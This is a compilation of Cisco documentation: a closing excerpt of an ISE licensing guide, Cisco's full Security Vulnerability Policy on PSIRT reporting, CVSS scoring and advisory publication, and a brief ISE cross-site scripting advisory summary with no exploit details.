When a network administrator tries to connect to a network device, the device sends out a “request for connection” to Cisco ISE, and Cisco ISE asks for their credentials. Credentials are verified against an identity source.

Next, the network device asks Cisco ISE to authorize the network administrator. Once they get access to the shell prompt, the network administrator can start executing commands. Cisco ISE can be configured to authorize individual commands as well.

8.9.3. How to license Device Administration

●      License that enables Device Administration: Device Admin license

●      License consumption: Device Admin licenses are consumed per Policy Service Node (PSN). You must have a Device Admin license for each of the PSNs that you enable TACACS+ service on. Device Administration using TACACS+ does not consume endpoints, and there is no limit on network devices for Device Administration. The user does not require an Essentials license.

8.10 Workload Connector

8.10.1 Why Workload Connectors

Zero Trust access from anywhere requires consistent access and segmentation policies between users, devices, and application workloads. Cisco ISE collects contextual data from workloads using Workload Connectors. Workloads can be classified with Security Group Tags (SGTs) based on this imported context from the data center and cloud providers. This context can be used to create and enforce effective network access control policies and can also be shared with ecosystem partners to enrich their services. For example, in the Cisco Secure Firewall, policies can be written based on the identity context, which has been assigned by ISE utilizing attributes such as device type, location, owner, the ACI Endpoint Group, and others.

8.10.2 How do Workload Connectors work?

![Workload Connectors](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_32.png)

Figure 19.

Workload Connectors

Create connections in Cisco ISE with on-prem and cloud platforms. Import workload context from those platforms. Create rules to assign those workloads to Security Groups by referring to the ([why segmentation](https://www.cisco.com/c/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.html#871Whysegmentation)) section and share the workload context with ISE ecosystem partners to build consistent Zero Trust policies in a multidomain environment.

## Purpose

This policy was created to guide and inform Cisco customers in the event of a reported vulnerability in a Cisco product or cloud-hosted service. It ensures that Cisco customers have a consistent, unambiguous resource to help them understand how Cisco responds to events of this nature.

## Policy

This policy clearly states how Cisco addresses reported security vulnerabilities in Cisco products and cloud-hosted services, including the timeline, actions, and responsibilities that apply to all customers.

## Cisco Product Security Incident Response

The Cisco Product Security Incident Response Team (PSIRT) is responsible for responding to Cisco product security incidents. The Cisco PSIRT is a dedicated, global team that manages the receipt, investigation, and public reporting of information about security vulnerabilities and issues related to Cisco products and services. Cisco defines a security vulnerability as a weakness in the computational logic (e.g., code) found in software and hardware components that, when exploited, results in a negative impact to confidentiality, integrity, or availability. Cisco reserves the right to deviate from this definition based on specific circumstances. The Cisco PSIRT adheres to ISO/IEC 29147:2018, which are [guidelines for disclosure of potential vulnerabilities](https://www.iso.org/standard/72311.html) established by the International Organization for Standardization.

The on-call Cisco PSIRT works 24 hours a day with Cisco customers, independent security researchers, consultants, industry organizations, and other vendors to identify possible security vulnerabilities and issues with Cisco products and networks.

## Reporting or Obtaining Support for a Suspected Security Vulnerability

Individuals or organizations that are experiencing a product security issue are strongly encouraged to contact the Cisco PSIRT. Cisco welcomes reports from independent researchers, industry organizations, vendors, customers, and other sources concerned with product or network security. At minimum, a description of the potential vulnerability is needed to report a security issue.

To contact the Cisco PSIRT, use one of the following methods:

*Primary approach:* The most effective method for reaching the Cisco PSIRT is sending an email to psirt@cisco.com. In the email, provide a detailed problem description and any relevant details and logs.

Alternatively, the Cisco PSIRT may be contacted using the following phone numbers:

* +1 877 228 7302 (toll-free within North America)
* +1 408 525 6532 (international direct dial)

These contact numbers route to Cisco global customer support. To facilitate engagement, please explain that this is a product security issue or, alternatively, reference the PSIRT-SVP-001 search code.

Cisco encourages customers to encrypt sensitive information that is sent to Cisco by email. The Cisco PSIRT supports encrypted messages via Pretty Good Privacy (PGP)/GNU Privacy Guard (GPG) encryption software. The Cisco PSIRT public key is available at the following link: <https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc>.

**Note:** Cisco supports an RFC 9116-compliant security.txt file, located at <https://www.cisco.com/.well-known/security.txt>.

## General Security-Related Queries

For general security concerns about Cisco products and cloud-hosted services, the Cisco Technical Assistance Center (TAC) can provide configuration and technical assistance. The Cisco TAC can also help with nonsensitive security incidents and software upgrades for security bug fixes. To contact the Cisco TAC, use one of the following methods:

|  | **Cisco TAC Support** |
| --- | --- |
| **Phone** | +1 800 553 2447 (toll-free within North America)+1 408 526 7209 (international direct dial) Additional TAC numbers: [Customer Service Contacts](https://www.cisco.com/c/en/us/support/web/tsd-cisco-worldwide-contacts.html) |
| **Web** | <https://mycase.cloudapps.cisco.com/start> |
| **Hours** | 24 hours a day, 7 days a week |

### **Cisco.com**

The [Cisco Security portal](https://www.cisco.com/security) on Cisco.com provides Cisco security vulnerability documents and Cisco security information, including relevant security products and services.

For direct links to specific security functions, see the [Types of Security Publications](#tosp) section of this
document.

### **Email**

Cisco Security Advisories provide information about Critical-, High-, and Medium-severity security vulnerabilities. They are clear signed with the Cisco PSIRT [PGP public key](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc) and distributed to the external cust-security-announce@cisco.com mailing list. The Cisco PSIRT may also send Informational advisories to the cust-security-announce mailing list. Informational advisories are used not as a disclosure mechanism for any Cisco vulnerabilities but for sharing information on security incidents that may impact Cisco products and that may be of interest to Cisco customers.

Emails are sent for the initial release of and major revisions to Cisco Security Advisories. A major revision is defined as a significant change to advisory content that could result in the customer addressing the vulnerability differently. Examples of a major advisory change include, but are not limited to, changes to the affected products list, changes in Security Impact Rating (SIR; see the [Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating](#asr) section of this document), and changes in mitigation and/or fix information. If a document undergoes a minor revision, the update will be posted to Cisco.com without an accompanying email. Customers that require automated alerts for minor revisions should subscribe to the Cisco Security Advisory Really Simple Syndication (RSS) feed or My Notifications. All Security Advisories on Cisco.com are displayed in chronological order, with the most recent advisories and updates appearing at the top of the page.

To subscribe to the cust-security-announce mailing list, email cust-security-announce-join@cisco.com. (The content of the message does not matter.) You will receive confirmation, instructions, and a list policy statement.

Please note that requests must be sent to cust-security-announce-join@cisco.com and not to the cust-security-announce@cisco.com list itself.

To unsubscribe from the cust-security-announce mailing list, email cust-security-announce-leave@cisco.com with the word "unsubscribe" in the subject line. (The content of the message does not matter.) You will receive a confirmation notice, to which you need to reply to be unsubscribed. You will not be unsubscribed unless you reply to the confirmation email.

Please note that requests to subscribe must be sent to cust-security-announce-join@cisco.com, and requests to unsubscribe must be sent to cust-security-announce-leave@cisco.com—not to the cust-security-announce@cisco.com email address itself.

You must send the messages from the account that you want to be subscribed to or unsubscribed from the list.

Customers can also request to be subscribed or unsubscribed to the cust-security-announce mailing list by emailing psirt@cisco.com.

### **RSS Feeds**

Cisco security vulnerability information is also available via RSS feeds from Cisco.com. These feeds are free and do not require an active Cisco.com registration. For information on how to subscribe to the RSS feeds, visit the [Cisco Security RSS Feeds page](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44).

### **Cisco PSIRT openVuln API**

The Cisco PSIRT openVuln application programming interface (API) is a RESTful API that conforms to the [representational state transfer](https://restfulapi.net/) (REST) software architectural style and allows customers to obtain Cisco security vulnerability information in different machine-consumable formats. To learn about accessing and using the API, visit the [PSIRT page](https://developer.cisco.com/site/PSIRT) on the Cisco DevNet website.

### **My Notifications**

The [My Notifications website](https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html) allows registered Cisco.com users to subscribe to and receive important Cisco product and technology information, including Cisco Security Advisories.

| **Additional Public Relations** | media\_pr@cisco.com |

## Commitment to Product Security and Integrity at Cisco

Cisco product development practices specifically prohibit any intentional behaviors or product features that are designed to allow unauthorized device or network access, exposure of sensitive device information, or a bypass of security features or restrictions. These include, but are not limited to:

* Undisclosed device access methods or "back doors"
* Hardcoded or undocumented account credentials
* Covert communication channels
* Undocumented traffic diversion

Cisco considers such product behaviors to be serious vulnerabilities. Cisco will address any issues of this nature with the highest priority and encourages all parties to report suspected vulnerabilities to the Cisco PSIRT for immediate investigation. Internal and external reports of these vulnerabilities will be managed and disclosed in accordance with the terms of the Cisco Security Vulnerability Policy.

More information can be found on the [Cisco Secure Development Lifecycle (CSDL) website](https://www.cisco.com/c/en/us/about/trust-center/technology-built-in-security.html#~stickynav=2).

## Cisco Product Security Incident Response Process

Figure 1 illustrates the vulnerability life cycle and the Cisco PSIRT disclosure and resolution process at a high level.

**Figure 1.** Cisco Product Security Incident Response Process

![response process cycle from awareness to feedback](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/public/files/images/white_papers/psirtprocess.jpg "Cisco Product Security Incident Response Process")

The steps in the process illustrated in Figure 1 are as follows:

1. **Awareness:** PSIRT receives notification of a security incident.
2. **Active Management:** PSIRT prioritizes and identifies resources.
3. **Software Fixes:** PSIRT coordinates the fix and impact assessment.
4. **Customer Notification:** PSIRT notifies all customers simultaneously.

The Cisco PSIRT investigates all reports regardless of the Cisco software code version or product life cycle status until the product reaches the [Last Day of Support](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (LDoS). Issues will be prioritized based on the potential severity of the vulnerability and other environmental factors. Ultimately, the resolution of a reported incident may require upgrades to products and cloud-hosted services that are under active support from Cisco. As a best practice, Cisco strongly recommends that customers periodically verify that their products are under active support for access to the latest software updates and other benefits.

Throughout the investigative process, the Cisco PSIRT strives to work collaboratively with the source of the report (incident reporter) to confirm the nature of the vulnerability, gather required technical information, and ascertain appropriate remedial action. When the initial investigation is complete, results will be delivered to the incident reporter along with a plan for resolution and public disclosure. If the incident reporter disagrees with the conclusion, the Cisco PSIRT will make every effort to address those concerns.

In the case of incidents about which an agreement cannot be reached through the normal process, incident reporters may escalate by contacting the [Cisco TAC](#gsrq) and requesting the director of the global Cisco PSIRT team.

During any investigation, the Cisco PSIRT manages all sensitive information on a highly confidential basis. Internal distribution is limited to those individuals who have a legitimate need to know and can actively assist in the resolution. Similarly, the Cisco PSIRT asks incident reporters to maintain strict confidentiality until complete resolutions are available for customers and have been published by the Cisco PSIRT on the Cisco website through the appropriate coordinated disclosure.

With the agreement of the incident reporter, the Cisco PSIRT may acknowledge the reporter's contribution during the public disclosure of the vulnerability.

The Cisco PSIRT works with third-party coordination centers such as the [Computer Emergency Response Team Coordination Center](https://www.kb.cert.org/vuls/) (CERT/CC), [Computer Emergency Response Team of Finland](https://www.kyberturvallisuuskeskus.fi/en/) (CERT-FI), [Japan Computer Emergency Response Team](https://www.jpcert.or.jp/english/) (JP-CERT), and [National Protective Security Authority](https://www.npsa.gov.uk) (NPSA) to manage a coordinated industry disclosure for vulnerabilities reported to Cisco that may impact multiple vendors (for example, a generic protocol issue). In these situations, the Cisco PSIRT will either assist the incident reporter with contacting the coordination center or do so on the incident reporters behalf.

If a reported vulnerability involves a vendor product, the Cisco PSIRT will notify the vendor directly, coordinate with the incident reporter, or engage a third-party coordination center.

The Cisco PSIRT will coordinate with the incident reporter to determine the frequency of status updates on the incident and documentation updates.

In the event that Cisco becomes aware of a vulnerability that does not affect a Cisco product but does involve another vendor's product, Cisco will follow the Cisco [policy for reporting vulnerabilities to vendors](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html).

## Disclosure of Security Vulnerabilities Discovered as Part of Cisco Services Delivery

If a new or previously undisclosed security vulnerability is found during a Cisco Services engagement with a customer, Cisco will follow the [Cisco Product Security Incident Response Process](#cpsirp). Vulnerabilities found in Cisco products and cloud-hosted services will be handled by the Cisco PSIRT according to the [Cisco Security Vulnerability Policy](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html). If the vulnerability is in another vendors product, Cisco will follow the [Cisco Vendor Vulnerability Reporting and Disclosure Policy](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html) unless the affected customer wishes to report the vulnerability to the vendor directly; in that case, Cisco will facilitate contact between the customer and the vendor, and will notify CERT/CC (or its national equivalent).

Cisco will protect customer-specific data at all times throughout this process. Specifically, Cisco will not share any customer-specific data unless directed to do so by the affected customer, or as required by a legal investigation.

### **Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating**

Cisco uses [Version 3.1](https://www.first.org/cvss/v3-1/) of the [Common Vulnerability Scoring System](https://www.first.org/cvss/) (CVSS) as part of its standard process of evaluating reported potential vulnerabilities that do not have a CVE in Cisco products and cloud-hosted services. The CVSS model uses three distinct measurements, or scores, that include Base, Temporal, and Environmental calculations. Cisco will provide an evaluation of the Base vulnerability score and, in some instances, the Temporal vulnerability score. End users are encouraged to compute the Environmental score based on their network parameters. The combination of all three scores should be considered the final score, which represents a moment in time and is tailored to a specific environment. Organizations are advised to use this final score to prioritize responses in their own environments.

**Note:** Cisco began transitioning to CVSS Version 3.1 (CVSSv3.1) in May 2020.

In addition to CVSS scores, Cisco uses the Security Impact Rating (SIR) as a way to categorize vulnerability severity in a simpler manner. The SIR is based on the CVSS Qualitative Severity Rating Scale of the Base score, may be adjusted by PSIRT to account for Cisco-specific variables, and is included in every Cisco Security Advisory. Cisco uses the following guidelines to determine the Cisco Security Advisory type for vulnerabilities in Cisco-authored, customer-managed software. Security Advisories for Critical, High, and Medium SIRs include fixed software information.

| **Publication** | **Type** | **CVSS** | **CVE** | **Fix Information** | **Machine-Readable Format** |
| --- | --- | --- | --- | --- | --- |
| Cisco Security Advisory | Critical | 9.0–10.0 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, Adaptive Security Appliance (ASA), Firepower Threat Defense (FTD), and Firepower Management Center (FMC) Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| High | 7.0–8.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Medium | 4.0–6.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Informational | N/A | No | Fix information in bug (if applicable). | [RSS](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |

Issues with a Low SIR are typically published as a bug Release Note Enclosure (RNE) and not as a Security Advisory.

Cisco reserves the right to deviate from these guidelines in specific cases if additional factors are not properly captured in the CVSS score.

If there is a security issue with a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the third party. In some cases, Cisco may adjust the CVSS score to reflect the impact to the Cisco product.

**Note:** Cisco is a [Common Vulnerabilities and Exposures](https://cve.mitre.org/index.html) (CVE) Numbering Authority and will assign CVE IDs to Cisco software vulnerabilities from the MITRE block of IDs assigned to the company for this purpose. Cisco does not assign CVE IDs for reported vulnerabilities until the vulnerabilities have been confirmed by Cisco. After vulnerabilities are published, Cisco provides CVE details to MITRE for inclusion in its database.

For more information about CVSS, visit [FIRST.org](https://www.first.org/cvss/).
### **Cisco Cloud-Hosted Services**

Cisco offers multiple cloud-hosted services that are used by customers but are maintained, patched, and monitored by Cisco.

The Cisco PSIRT responds to vulnerabilities in Cisco cloud-hosted services and works closely with the teams that operate them. These teams ensure that security vulnerabilities are fixed and patches are deployed to all customer instances in a timely manner.

Typically, service-related security events are communicated to customers by the service teams through direct notification or through the service dashboard or portal. In some instances, Cisco may disclose vulnerabilities through Security Advisories for Cisco cloud-hosted services in coordination with the service teams.

In most cases, no user action is required because Cisco regularly patches cloud-hosted services.

### **Third-Party Software Vulnerabilities**

If there is a vulnerability in a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the component creator. Cisco may adjust the CVSS score to reflect the impact to Cisco products.

Cisco will consider a third-party vulnerability “high profile” if it meets the following criteria:

* The vulnerability exists in a third-party component.
* Multiple Cisco products and/or cloud-hosted services are affected.
* The CVSS score is 5.0 or above.
* The vulnerability has gathered significant public attention.
* The vulnerability is likely to have exploits available and is expected to be, or is being, actively exploited.

For high profile, third-party vulnerabilities, Cisco will begin assessing all potentially impacted products and cloud-hosted services that have not reached the LDoS and publish a Security Advisory within 24 hours after Cisco classifies the vulnerability as high profile. All known affected Cisco products and cloud-hosted services will be detailed in an update to the initial Security Advisory that will be published within 7 days of the initial disclosure. A Cisco bug will be created for each vulnerable product so that registered customers can view them using the Cisco Bug Search Toolkit. Third-party vulnerabilities that are not classified as high profile will be disclosed in a Release Note Enclosure.

### **Cisco Vulnerability Repository**

The [Cisco Vulnerability Repository](https://sec.cloudapps.cisco.com/security/center/cvr) (CVR) is a vulnerability search engine for CVEs reported after 2017 that may impact Cisco products. CVR can help customers understand if their Cisco product is affected by a particular third-party software vulnerability. This tool also displays any Cisco Security Advisories associated with a CVE. At this time, CVR does not include Cisco cloud offers. For help with a product not listed in this tool, please use the Feedback link on the [CVR page](https://sec.cloudapps.cisco.com/security/center/cvr) or contact your support organization.

### **Vulnerability Exploitability eXchange**

Customers may request a Vulnerability Exploitability eXchange (VEX) document for any CVE in CVR.

### **Types of Security Publications**

In all security publications, Cisco discloses the information required for an end user to assess the impact of a vulnerability and any potential steps needed to protect their environment. Cisco does not provide vulnerability details that could enable someone to craft an exploit. Cisco Security Advisories are point-in-time documents. Information should only be considered up to date as of the time and date of the last publication update as indicated by the "Last Updated" field in the advisory header.

Cisco provides the following types of security-related publications via the [Cisco Security portal](https://www.cisco.com/security) on Cisco.com.

### Cisco Security Advisories

[Cisco Security Advisories](https://sec.cloudapps.cisco.com/security/center/publicationListing.x) provide detailed information about security issues that directly involve Cisco products and cloud-hosted services and require an upgrade, fix, or other customer action. Security Advisories are used to disclose vulnerabilities in Cisco-authored software or in high-profile third-party software with a Critical, High, or Medium SIR. The Cisco PSIRT only validates the affected and fixed version information documented in the advisory.

All Cisco Security Advisories that disclose vulnerabilities with a Critical, High, or Medium SIR include an option to download [Common Security Advisory Framework (CSAF)](https://csaf.io/) content. CSAF is an industry standard designed to depict vulnerability information in machine-readable format. This machine-readable content can be used with other tools to automate the process of interpreting data contained in a Security Advisory. CSAF content can be downloaded directly from each Security Advisory. For more information about CSAF, see the preceding link.

The Informational type of Cisco Security Advisories addresses issues that require a response to information discussed in a public forum, such as a blog or discussion list. Informational advisories are normally published if a third party makes a public statement about a Cisco product vulnerability. Informational advisories may also be used to proactively notify customers about a security-related issue that is not a vulnerability.

### Cisco Event Responses

Cisco [Event Responses](https://sec.cloudapps.cisco.com/security/center/erp.x?i=52) provide information about security events that have the potential for widespread impact on customer networks, applications, and devices. Cisco Event Responses contain summary information, threat analysis, and mitigation techniques that feature Cisco products and cloud-hosted services. They are normally published under the following circumstances:

* If a significant security vulnerability exists in a vendor's product that could affect a Cisco product due to interoperation with the vendor's product or use of the network as a vector for exploitation
* In response to the release of Cisco IOS and IOS XE, Cisco IOS XR, Cisco NX-OS, and Cisco ASA, FTD, and FMC Software bundled publications

### Release Note Enclosures

Release Note Enclosures are used to disclose issues with a Low SIR and most third-party software vulnerabilities. All Cisco bug IDs that are disclosed by Cisco are available for registered customers to view in the [Cisco Bug Search Tool](https://tools.cisco.com/bugsearch/).

If a Cisco Security Advisory references a bug, the bug entry in the Cisco Bug Search Tool will link to the relevant Cisco Security Advisory.

Any Cisco bug that has been evaluated by the Cisco PSIRT includes a "PSIRT Evaluation" section in its Release Note Enclosure. This section includes, where Cisco deems appropriate and relevant, Base and Temporal CVSS scores and a CVE ID. Customers are invited to use this additional information at their discretion and correlate Cisco bugs with industry events. This information is not intended to supplement any standard Cisco warranties applicable to the software as stated in the [Cisco End User License Agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html).

Free software updates will not be provided for issues that are disclosed through a Release Note Enclosure. Customers who wish to upgrade to a software version that includes fixes for those issues should contact their normal support channels. Any exception to this policy will be determined solely at the discretion of Cisco.

The following table summarizes the methods used to notify customers about the aforementioned security publications. Exceptions may be made on a case-by-case basis to increase communication for a given document.

| **Publication** | **Email** | **Security Portal** | **RSS** | **CNS** | **openVuln API** | **Bug Search Tool** |
| --- | --- | --- | --- | --- | --- | --- |
| **Cisco Security Advisory—Critical and High Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Medium Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Informational** | Yes | Yes | Yes | No | No | Yes |
| **Cisco Event Response** | No | Yes | Yes | No | No | No |
| **Release Note Enclosure** | No | No | No | No | No | Yes |

### **Communications Plan**

If one or more of the following conditions exist, Cisco will publicly disclose Cisco Security Advisories:

* The Cisco PSIRT has completed the incident response process and determined that enough software patches or workarounds exist to address the vulnerability, or subsequent public disclosure of code fixes is planned to address high-severity vulnerabilities.
* The Cisco PSIRT has observed active exploitation of a vulnerability that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* There is the potential for increased public awareness of a vulnerability affecting Cisco products and/or cloud-hosted services that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* The Cisco PSIRT has declared a third-party software vulnerability to be "high profile."

All Cisco security publications are disclosed to customers and the public simultaneously.

When coordinating disclosure with third parties, the Cisco PSIRT will attempt to provide notification of any changes to the Cisco PSIRT public disclosure schedule.

As documented in the [Receiving Security Vulnerability Information from Cisco](#rsvifc) section of this document, Cisco delivers technical security information about software fixes in Cisco products and distributes product updates through several channels. Cisco reserves the right to deviate from this policy on an exception basis to ensure access to Cisco.com for software patch availability.

### **Disclosure Schedule**

In direct response to customer feedback, Cisco releases the following bundles of Cisco Security Advisories at 1600 Greenwich Mean Time (GMT) on a regular schedule twice each year. This schedule applies to the disclosure of vulnerabilities in the following Cisco products and does not apply to the disclosure of vulnerabilities in other Cisco products.

| **Cisco Product(s)** | **Release Schedule** |
| --- | --- |
| Cisco NX-OS Software | Fourth Wednesday of February and August |
| Cisco IOS XR Software | Second Wednesday in March and September |
| Cisco IOS and IOS XE Software | Fourth Wednesday in March and September |

### All Other Products

Cisco generally discloses Cisco Security Advisories at 1600 GMT on any given Wednesday.

### Exceptions

Cisco reserves the right to publish an individual Security Advisory for Cisco IOS and IOS XE Software, Cisco IOS XR Software, or Cisco NX-OS Software or other products outside the published schedule. Conditions under which an out-of-cycle publication may occur include, but are not limited to, the following:

* Cisco detects heightened public awareness of a serious vulnerability.
* Cisco learns of active exploitation of a vulnerability.
* Cisco works with a third-party coordination center to publicly disclose a vulnerability.

### **Incident Response Eligibility**

All customers, regardless of contract status, are eligible to receive support from the Cisco TAC for a known or reasonably suspected security vulnerability in Cisco products and services. For more information about how to contact the Cisco TAC, see the [General Security-Related Queries](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html#gsrq) section of this document. Customers who contact the Cisco TAC should reference the URL of the Cisco security publication to assist in connecting with the proper support team.

Customers with paid service contracts for incident response and forensic assistance should request assistance through the contact methods specified in their contract.

Cisco, at its sole discretion, may offer customers additional security services free of charge. Cisco reserves the right to determine the type and degree of free assistance it may offer in connection with any incident and to withdraw from such an incident at any time.

### **Security Software Updates**

The Cisco PSIRT will investigate and disclose vulnerabilities in Cisco products and services from the date of First Commercial Shipment (FCS) to the [LDoS](https://www.cisco.com/c/en/us/products/eos-eol-policy.html). Cisco customers with service contracts that entitle them to regular software updates should obtain security fixes through their usual update channels, generally from the Cisco website for the relevant product. Cisco recommends contacting the Cisco TAC only with specific and imminent problems or questions.

As a special customer service, and to improve the overall security of the internet, Cisco may offer customers free software updates to address high-severity security problems. The decision to provide free software updates is made on a case-by-case basis. Refer to the Cisco security publication for details. Free software updates will typically be limited to Critical- and High-severity vulnerabilities.

Fixes for some third-party software vulnerabilities may be available only in the most recent major software releases and not backported to older releases.

If Cisco has offered a free software update to address a specific issue, noncontract customers who are eligible for the update may obtain it by contacting the Cisco TAC using any of the methods described in the [General Security-Related Queries](#gsrq) section of this document.

**Note:** To verify their entitlement, individuals who contact the Cisco TAC should have available the URL of the Cisco document that is offering the update.

Customers may only download, install, and expect support for software releases and feature sets for which they have purchased a valid license that is current and active. By installing, downloading, accessing, or otherwise using such software updates, customers agree to follow the terms of the [Cisco software license agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html). In most cases, the software update will be a maintenance release to software that was previously purchased. Free security software updates do not entitle customers to a new software license, additional software feature sets, or major revision upgrades.

After [End of Sale](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (EoS), the availability of security fixes for vulnerabilities is defined in the product’s EoS bulletin. (See the [End-of-Life Policy](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) for details.) The EoS bulletin may define the Last Day of Support (**LDoS**) milestone, which identifies the last date that Cisco will investigate and disclose product vulnerabilities.

Once the LDoS has been reached, the Cisco PSIRT will continue to accept vulnerability reports but will not analyze, fix, or disclose potential vulnerabilities. To this end, the Cisco PSIRT will not issue CVEs for issues reported on products that are past the LDoS milestone.

### Security Advisory Terms and Conventions

**Fixed Release Availability:** If a future release date is indicated for software, the date provided represents an estimate based on all information known to Cisco as of the "Last Updated" date at the top of the advisory. Availability dates are subject to change based on a number of factors, including satisfactory testing results and delivery of other priority features and fixes. If no version or date is listed for an affected component (indicated by a blank field and/or an advisory designation of Interim), Cisco is continuing to evaluate the fix and will update the advisory as additional information becomes available. After the advisory is marked Final, customers should refer to the associated Cisco bug(s) for further details.

The designated Security Advisory status indicates the following:

**Interim:** The Cisco investigation is ongoing. Cisco will issue revisions to the advisory when additional information, including fixed software release data, becomes available.

**Final:** Cisco has completed its evaluation of the vulnerability described in the advisory. There will be no further updates unless there is a material change in the nature of the vulnerability.

All aspects of this process are subject to change without notice and on a case-by-case basis. No particular level of response is guaranteed for any specific issue or class of issues.

This vulnerability is due to insufficient validation of user-supplied input by the web-based management interface of an affected device. An attacker could exploit this vulnerability by injecting malicious code into specific pages of the interface. A successful exploit could allow the attacker to execute arbitrary script in the context of the affected interface or access sensitive, browser-based information.  Cisco has released software updates that address this vulnerability. There are no workarounds that address this vulnerability.  This advisory is available at the following link:<https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ise-xss-ubfHG75C>  Affected Products  * Vulnerable Products At the time of publication, this vulnerability affected Cisco devices if they were running a vulnerable release of Cisco ISE and had the Posture feature enabled.
